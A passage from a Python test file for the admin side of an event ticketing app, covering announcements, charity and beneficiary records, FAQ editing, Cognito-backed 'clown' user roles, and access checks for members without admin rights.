        data={"event_id": "evt_2026", "subject": "Update", "body": "Details.",
              "audience": ["attendees"]},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/announcements?event_id=evt_2026"

    items = ANNOUNCEMENTS().scan()["Items"]
    assert len(items) == 1
    assert items[0]["status"] == "queued"
    assert items[0]["subject"] == "Update"
    assert items[0]["audience"] == ["attendees"]

    mock_invoke.assert_called_once_with(items[0]["announcement_id"])


@patch("app.routes.admin._invoke_announcement_lambda")
def test_create_announcement_rejects_no_audience(mock_invoke, admin_client):
    _put_event()
    resp = admin_client.post(
        "/admin/announcements",
        data={"event_id": "evt_2026", "subject": "Update", "body": "Details."},
        follow_redirects=False,
    )
    assert resp.status_code == 400
    assert "at least one audience" in resp.text.lower()
    assert ANNOUNCEMENTS().scan()["Items"] == []
    mock_invoke.assert_not_called()


@patch("app.routes.admin._invoke_announcement_lambda")
def test_create_announcement_rejects_empty_subject_or_body(mock_invoke, admin_client):
    _put_event()
    resp = admin_client.post(
        "/admin/announcements",
        data={"event_id": "evt_2026", "subject": "  ", "body": "Details.",
              "audience": ["waitlist"]},
        follow_redirects=False,
    )
    assert resp.status_code == 400
    assert ANNOUNCEMENTS().scan()["Items"] == []
    mock_invoke.assert_not_called()


def test_list_announcements_defaults_event_id(admin_client):
    _put_event(status="open")
    resp = admin_client.get("/admin/announcements", follow_redirects=False)
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/announcements?event_id=evt_2026"


# ---- Charity benefit ----

def test_charity_admin_page_defaults_event_id(admin_client):
    _put_event(status="open")
    resp = admin_client.get("/admin/charity", follow_redirects=False)
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/charity?event_id=evt_2026"


def test_charity_admin_page_shows_current_values(admin_client):
    _put_event(charity_name="Habitat NOLA", charity_website_url="https://habitat.example")
    resp = admin_client.get("/admin/charity?event_id=evt_2026")
    assert resp.status_code == 200
    assert "Habitat NOLA" in resp.text
    assert "https://habitat.example" in resp.text


def test_update_charity_saves_fields(admin_client):
    _put_event()
    resp = admin_client.post(
        "/admin/charity",
        data={
            "event_id": "evt_2026",
            "charity_name": "  Habitat NOLA  ",
            "charity_description": "We build homes.",
            "charity_website_url": "https://habitat.example",
            "charity_contact_name": "Pat",
            "charity_contact_email": "pat@habitat.example",
            "charity_contact_phone": "5045551234",
        },
        follow_redirects=False,
    )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/charity?event_id=evt_2026"
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["charity_name"] == "Habitat NOLA"
    assert event["charity_description"] == "We build homes."
    assert event["charity_website_url"] == "https://habitat.example"
    assert event["charity_contact_email"] == "pat@habitat.example"


def test_update_charity_clears_blank_fields(admin_client):
    _put_event(charity_name="Old Name", charity_contact_name="Old Pat")
    admin_client.post(
        "/admin/charity",
        data={"event_id": "evt_2026", "charity_name": "", "charity_contact_name": ""},
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event.get("charity_name") is None
    assert event.get("charity_contact_name") is None


def test_update_charity_rejects_bad_website_url(admin_client):
    _put_event()
    resp = admin_client.post(
        "/admin/charity",
        data={"event_id": "evt_2026", "charity_name": "X", "charity_website_url": "habitat.example"},
        follow_redirects=False,
    )
    assert resp.status_code == 400
    assert "http://" in resp.text
    assert EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"].get("charity_name") is None


def test_update_charity_uploads_logo_and_banner_images_with_captions(admin_client):
    _put_event()
    resp = admin_client.post(
        "/admin/charity",
        data={
            "event_id": "evt_2026", "charity_name": "Habitat NOLA",
            "charity_banner_caption": "Build day", "charity_banner_caption_3": "Ribbon cutting",
        },
        files={
            "charity_logo": ("logo.png", b"logo-bytes", "image/png"),
            "charity_banner_image": ("b1.jpg", b"banner-one", "image/jpeg"),
            "charity_banner_image_2": ("b2.jpg", b"banner-two", "image/jpeg"),
            "charity_banner_image_3": ("b3.jpg", b"banner-three", "image/jpeg"),
        },
        follow_redirects=False,
    )
    assert resp.status_code == 303
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    for field in (
        "charity_logo_url", "charity_banner_image_url",
        "charity_banner_image_url_2", "charity_banner_image_url_3",
    ):
        assert event[field].startswith("https://event-images-test.s3.")
    assert event["charity_banner_caption"] == "Build day"
    assert event.get("charity_banner_caption_2") is None
    assert event["charity_banner_caption_3"] == "Ribbon cutting"


def test_update_charity_removes_one_banner_slot_and_leaves_others(admin_client):
    _put_event(
        charity_name="Habitat NOLA",
        charity_banner_image_url="https://example.com/b1.jpg",
        charity_banner_image_url_2="https://example.com/b2.jpg",
        charity_banner_image_url_3="https://example.com/b3.jpg",
    )
    admin_client.post(
        "/admin/charity",
        data={
            "event_id": "evt_2026", "charity_name": "Habitat NOLA",
            "remove_charity_banner_image_2": "1",
        },
        follow_redirects=False,
    )
    event = EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"]
    assert event["charity_banner_image_url"] == "https://example.com/b1.jpg"
    assert event.get("charity_banner_image_url_2") is None
    assert event["charity_banner_image_url_3"] == "https://example.com/b3.jpg"


def test_update_charity_rejects_oversized_image(admin_client):
    """Client-side JS is the first line of defence; the server still enforces it
    for anything that gets past the browser."""
    _put_event()
    oversized = b"x" * (2 * 1024 * 1024 + 1)
    resp = admin_client.post(
        "/admin/charity",
        data={"event_id": "evt_2026", "charity_name": "Habitat NOLA"},
        files={"charity_banner_image": ("big.jpg", oversized, "image/jpeg")},
        follow_redirects=False,
    )
    assert resp.status_code == 400
    assert "under 2mb" in resp.text.lower()
    assert EVENTS().get_item(Key={"event_id": "evt_2026"})["Item"].get("charity_banner_image_url") is None


def test_orders_export_has_donation_column_not_attendees(admin_client):
    _put_order("ord_d", quantity=1, total_cents=17500, donation_cents=2500)
    resp = admin_client.get("/admin/orders/export?event_id=evt_2026")
    assert "donation_usd" in resp.text
    assert "attendee_names" not in resp.text
    assert "25.00" in resp.text


# ---- Past beneficiaries ----

def test_beneficiaries_admin_page_renders(admin_client):
    PAST_BENEFICIARIES().put_item(Item={
        "beneficiary_id": "ben_x", "name": "Habitat NOLA", "year": 2024,
        "amount_cents": 500000, "description": None, "website_url": None,
        "logo_url": None, "created_at": "2026-01-01T00:00:00Z",
    })
    resp = admin_client.get("/admin/beneficiaries")
    assert resp.status_code == 200
    assert "Habitat NOLA" in resp.text
    assert "$5,000" in resp.text


def test_create_beneficiary_stores_everything(admin_client):
    resp = admin_client.post(
        "/admin/beneficiaries",
        data={
            "name": "  Habitat NOLA  ", "year": "2024", "amount_dollars": "15000",
            "website_url": "https://habitat.example", "description": "Builds homes.",
        },
        files={"logo": ("logo.png", b"fake-png-bytes", "image/png")},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/beneficiaries"
    item = PAST_BENEFICIARIES().scan()["Items"][0]
    assert item["name"] == "Habitat NOLA"
    assert int(item["year"]) == 2024
    assert int(item["amount_cents"]) == 1500000
    assert item["website_url"] == "https://habitat.example"
    assert item["description"] == "Builds homes."
    assert item["logo_url"].startswith("https://event-images-test.s3.")

    key = item["logo_url"].split(".amazonaws.com/", 1)[1]
    obj = boto3.client("s3", region_name="us-east-1").get_object(
        Bucket="event-images-test", Key=key
    )
    assert obj["Body"].read() == b"fake-png-bytes"


def test_create_beneficiary_requires_a_name(admin_client):
    resp = admin_client.post(
        "/admin/beneficiaries", data={"name": "  "}, follow_redirects=False
    )
    assert resp.status_code == 400
    assert "Name is required." in resp.text
    assert PAST_BENEFICIARIES().scan()["Items"] == []


def test_create_beneficiary_rejects_bad_website_and_negative_amount(admin_client):
    for bad in (
        {"name": "X", "website_url": "habitat.example"},
        {"name": "X", "amount_dollars": "-5"},
        {"name": "X", "amount_dollars": "12.50"},
        {"name": "X", "year": "not-a-year"},
    ):
        resp = admin_client.post("/admin/beneficiaries", data=bad, follow_redirects=False)
        assert resp.status_code == 400, bad
    assert PAST_BENEFICIARIES().scan()["Items"] == []


def test_delete_beneficiary(admin_client):
    PAST_BENEFICIARIES().put_item(Item={
        "beneficiary_id": "ben_del", "name": "Old", "amount_cents": 0,
        "description": None, "website_url": None, "logo_url": None, "year": None,
        "created_at": "2026-01-01T00:00:00Z",
    })
    resp = admin_client.post("/admin/beneficiaries/ben_del/delete", follow_redirects=False)
    assert resp.status_code == 303
    assert PAST_BENEFICIARIES().scan()["Items"] == []


# ---- FAQ ----

def _put_faq_admin(faq_id, question="Q?", answer="A.", sort_order=0):
    FAQ_ENTRIES().put_item(Item={
        "faq_id": faq_id, "question": question, "answer": answer,
        "sort_order": sort_order, "created_at": f"2026-01-0{sort_order + 1}T00:00:00Z",
    })


def test_faq_admin_page_renders_editable_rows(admin_client):
    _put_faq_admin("faq_x", question="Where do I park?", answer="On the street.", sort_order=3)
    resp = admin_client.get("/admin/faq")
    assert resp.status_code == 200
    assert 'value="Where do I park?"' in resp.text   # editable input, not read-only text
    assert ">On the street.</textarea>" in resp.text
    assert 'formaction="/admin/faq/faq_x/move"' in resp.text  # reorder arrows
    assert 'class="icon-btn"' in resp.text


def test_create_faq_entry_appends_to_the_bottom(admin_client):
    _put_faq_admin("faq_a", sort_order=0)
    resp = admin_client.post(
        "/admin/faq",
        data={"question": "  Is it free?  ", "answer": "  Yes.  "},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/faq"
    new = next(i for i in FAQ_ENTRIES().scan()["Items"] if i["question"] == "Is it free?")
    assert new["answer"] == "Yes."
    assert int(new["sort_order"]) == 1  # after the one existing entry


def test_create_faq_requires_question_and_answer(admin_client):
    for bad in ({"question": "  ", "answer": "A."}, {"question": "Q?", "answer": "   "}):
        resp = admin_client.post("/admin/faq", data=bad, follow_redirects=False)
        assert resp.status_code == 400, bad
    assert FAQ_ENTRIES().scan()["Items"] == []


def test_update_faq_entry(admin_client):
    _put_faq_admin("faq_e", question="Old q", answer="Old a", sort_order=2)
    resp = admin_client.post(
        "/admin/faq/faq_e",
        data={"question": "  New q  ", "answer": "  New a  "},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    item = FAQ_ENTRIES().get_item(Key={"faq_id": "faq_e"})["Item"]
    assert item["question"] == "New q"
    assert item["answer"] == "New a"
    assert int(item["sort_order"]) == 2  # position preserved


def test_update_faq_rejects_blank(admin_client):
    _put_faq_admin("faq_e", question="Keep", answer="Keep")
    resp = admin_client.post(
        "/admin/faq/faq_e", data={"question": "x", "answer": "  "}, follow_redirects=False
    )
    assert resp.status_code == 400
    assert FAQ_ENTRIES().get_item(Key={"faq_id": "faq_e"})["Item"]["question"] == "Keep"


def test_move_faq_reorders_and_renumbers(admin_client):
    _put_faq_admin("faq_1", question="one", sort_order=0)
    _put_faq_admin("faq_2", question="two", sort_order=1)
    _put_faq_admin("faq_3", question="three", sort_order=2)

    admin_client.post("/admin/faq/faq_2/move", data={"direction": "up"}, follow_redirects=False)

    order = {i["faq_id"]: int(i["sort_order"]) for i in FAQ_ENTRIES().scan()["Items"]}
    assert order == {"faq_2": 0, "faq_1": 1, "faq_3": 2}


def test_move_faq_at_the_edge_is_a_noop(admin_client):
    _put_faq_admin("faq_1", sort_order=0)
    _put_faq_admin("faq_2", sort_order=1)
    resp = admin_client.post(
        "/admin/faq/faq_1/move", data={"direction": "up"}, follow_redirects=False
    )
    assert resp.status_code == 303
    order = {i["faq_id"]: int(i["sort_order"]) for i in FAQ_ENTRIES().scan()["Items"]}
    assert order == {"faq_1": 0, "faq_2": 1}


def test_delete_faq_entry_renumbers_the_rest(admin_client):
    _put_faq_admin("faq_1", sort_order=0)
    _put_faq_admin("faq_2", sort_order=1)
    _put_faq_admin("faq_3", sort_order=2)

    resp = admin_client.post("/admin/faq/faq_1/delete", follow_redirects=False)
    assert resp.status_code == 303
    order = {i["faq_id"]: int(i["sort_order"]) for i in FAQ_ENTRIES().scan()["Items"]}
    assert order == {"faq_2": 0, "faq_3": 1}


# ---- Clown management (Cognito users) ----

_FAKE_CLOWNS = [
    {"username": "admin-1", "email": "me@example.com", "status": "CONFIRMED",
     "created": None, "is_admin": True},
    {"username": "admin-2", "email": "boss@example.com", "status": "CONFIRMED",
     "created": None, "is_admin": True},
    {"username": "sub-2", "email": "other@example.com", "status": "FORCE_CHANGE_PASSWORD",
     "created": None, "is_admin": False},
]


def test_clowns_page_lists_clowns_with_roles(admin_client):
    with patch("app.routes.admin._list_clowns", return_value=_FAKE_CLOWNS):
        resp = admin_client.get("/admin/clowns")
    assert resp.status_code == 200
    assert "Clown Management" in resp.text
    assert "me@example.com" in resp.text and "other@example.com" in resp.text
    assert "Admin" in resp.text and "Clown" in resp.text
    # promote button only for the non-admin clown
    assert 'action="/admin/clowns/sub-2/promote"' in resp.text
    assert 'action="/admin/clowns/admin-2/promote"' not in resp.text
    # demote ("Make clown") only for another admin, not yourself
    assert 'action="/admin/clowns/admin-2/demote"' in resp.text
    assert 'action="/admin/clowns/admin-1/demote"' not in resp.text
    # can't remove yourself; can remove anyone else
    assert 'action="/admin/clowns/sub-2/delete"' in resp.text
    assert 'action="/admin/clowns/admin-2/delete"' in resp.text
    assert 'action="/admin/clowns/admin-1/delete"' not in resp.text


def test_invite_clown_calls_cognito(admin_client):
    with patch("app.routes.admin._list_clowns", return_value=[]), \
         patch("app.routes.admin._create_clown") as mock_create:
        resp = admin_client.post(
            "/admin/clowns", data={"email": "  new@example.com "}, follow_redirects=False,
        )
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/clowns"
    mock_create.assert_called_once_with("new@example.com", make_admin=False)


def test_invite_clown_as_admin_passes_the_flag(admin_client):
    with patch("app.routes.admin._list_clowns", return_value=[]), \
         patch("app.routes.admin._create_clown") as mock_create:
        admin_client.post(
            "/admin/clowns", data={"email": "boss@example.com", "make_admin": "1"},
            follow_redirects=False,
        )
    mock_create.assert_called_once_with("boss@example.com", make_admin=True)


def test_invite_clown_rejects_blank_email(admin_client):
    with patch("app.routes.admin._list_clowns", return_value=[]), \
         patch("app.routes.admin._create_clown") as mock_create:
        resp = admin_client.post(
            "/admin/clowns", data={"email": "   "}, follow_redirects=False
        )
    assert resp.status_code == 400
    assert "Email is required." in resp.text
    mock_create.assert_not_called()


def test_invite_clown_handles_duplicate(admin_client):
    err = ClientError(
        {"Error": {"Code": "UsernameExistsException", "Message": "exists"}}, "AdminCreateUser",
    )
    with patch("app.routes.admin._list_clowns", return_value=[]), \
         patch("app.routes.admin._create_clown", side_effect=err):
        resp = admin_client.post(
            "/admin/clowns", data={"email": "dupe@example.com"}, follow_redirects=False,
        )
    assert resp.status_code == 400
    assert "already a clown" in resp.text


def test_promote_clown_calls_cognito(admin_client):
    with patch("app.routes.admin._list_clowns", return_value=[]), \
         patch("app.routes.admin._promote_clown") as mock_promote:
        resp = admin_client.post("/admin/clowns/sub-2/promote", follow_redirects=False)
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/clowns"
    mock_promote.assert_called_once_with("sub-2")


def test_demote_clown_calls_cognito(admin_client):
    with patch("app.routes.admin._list_clowns", return_value=[]), \
         patch("app.routes.admin._demote_clown") as mock_demote:
        resp = admin_client.post("/admin/clowns/admin-2/demote", follow_redirects=False)
    assert resp.status_code == 303
    assert resp.headers["location"] == "/admin/clowns"
    mock_demote.assert_called_once_with("admin-2")


def test_demote_clown_blocks_self(admin_client):
    with patch("app.routes.admin._list_clowns", return_value=_FAKE_CLOWNS), \
         patch("app.routes.admin._demote_clown") as mock_demote:
        resp = admin_client.post("/admin/clowns/admin-1/demote", follow_redirects=False)
    assert resp.status_code == 400
    assert "your own admin rights" in resp.text
    mock_demote.assert_not_called()


def test_delete_clown_calls_cognito(admin_client):
    with patch("app.routes.admin._list_clowns", return_value=[]), \
         patch("app.routes.admin._delete_clown") as mock_delete:
        resp = admin_client.post("/admin/clowns/sub-2/delete", follow_redirects=False)
    assert resp.status_code == 303
    mock_delete.assert_called_once_with("sub-2")


def test_delete_clown_blocks_self(admin_client):
    with patch("app.routes.admin._list_clowns", return_value=_FAKE_CLOWNS), \
         patch("app.routes.admin._delete_clown") as mock_delete:
        resp = admin_client.post("/admin/clowns/admin-1/delete", follow_redirects=False)
    assert resp.status_code == 400
    assert "your own account" in resp.text
    mock_delete.assert_not_called()


# ---- Member (clown without admin rights) access ----

def test_member_can_reach_shared_pages(member_client):
    _put_event(status="open")
    for path in ("/admin/orders", "/admin/checkin", "/admin/waitlist"):
        resp = member_client.get(path, follow_redirects=True)
        assert resp.status_code == 200, path


def test_member_is_bounced_from_admin_only_pages(member_client):
    _put_event(status="open")
    for path in (
        "/admin/events", "/admin/clowns", "/admin/charity",
        "/admin/give-tickets", "/admin/beneficiaries", "/admin/faq",
    ):
        resp = member_client.get(path, headers={"accept": "text/html"}, follow_redirects=False)
        assert resp.status_code == 303, path
        assert resp.headers["location"] == "/admin/orders", path


def test_member_cannot_refund(member_client):
    _put_event()
    _put_order("ord_x")
    resp = member_client.post(
        "/admin/orders/ord_x/refund", headers={"accept": "application/json"}
    )
    assert resp.status_code == 403


def test_member_nav_hides_admin_links(member_client):
    _put_event(status="open")
    resp = member_client.get("/admin/orders")
    assert 'href="/admin/checkin"' in resp.text
    assert 'href="/admin/events"' not in resp.text
    assert 'href="/admin/clowns"' not in resp.text


def test_admin_nav_shows_clowns_link(admin_client):
    _put_event()
    resp = admin_client.get("/admin/orders?event_id=evt_2026")
    assert 'href="/admin/clowns"' in resp.text
